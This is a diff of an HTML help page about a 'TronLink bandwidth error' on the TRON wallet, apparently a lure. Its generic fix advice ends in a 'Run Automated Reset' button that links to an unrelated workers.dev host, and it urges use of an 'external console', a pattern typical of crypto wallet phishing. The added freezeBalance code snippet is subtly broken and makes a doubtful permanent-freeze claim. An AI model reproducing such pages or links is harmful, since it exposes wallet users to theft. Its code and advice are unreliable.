@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0f111a;
+        font-family: BlinkMacSystemFont;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -41,32 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network using the TronLink wallet.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed or pending transactions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the user's account, which is required to process transactions on the TRON network. This can happen when a user has not acquired enough TRX tokens to freeze for bandwidth or has not waited for the bandwidth to replenish after recent transactions.</li>
+<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions on the network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Check the current bandwidth and energy levels in the TronLink wallet to determine if they are sufficient for the desired transaction.</li>
-<li>Freeze additional TRX tokens to increase the available bandwidth if necessary.</li>
+<li>Increase the account's bandwidth by freezing TRX tokens for a specified period.</li>
+<li>Adjust the transaction's bandwidth and energy limits using the following code:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_address&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;frozen_balance&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;frozen_balance&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;resource&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;BANDWIDTH&quot;</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>
+<span class="w">  </span><span class="s2">&quot;10000000&quot;</span>,<span class="w">  </span><span class="c1"># bandwidth</span>
+<span class="w">  </span><span class="s2">&quot;0&quot;</span>,<span class="w">         </span><span class="c1"># duration (0 for permanent freeze)</span>
+<span class="w">  </span><span class="nb">true</span><span class="w">         </span><span class="c1"># frozen</span>
+<span class="o">)</span><span class="p">;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex troubleshooting and configuration adjustments.</p>
+<ul>
+<li>Verify the account's bandwidth and energy levels using the TRON Web API to ensure they are sufficient for the transaction.</li>
+</ul>
+<p>Consider using an external console for more advanced troubleshooting and debugging. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of the TRON network and its resource management system.</li>
-<li>Access to the TronLink wallet and its settings.</li>
-<li>Sufficient TRX tokens to freeze for bandwidth or energy.</li>
+<li>TRON wallet with a sufficient balance of TRX tokens</li>
+<li>Basic understanding of TRON's resource management system</li>
+<li>Access to the TRON Web API or a compatible wallet interface</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
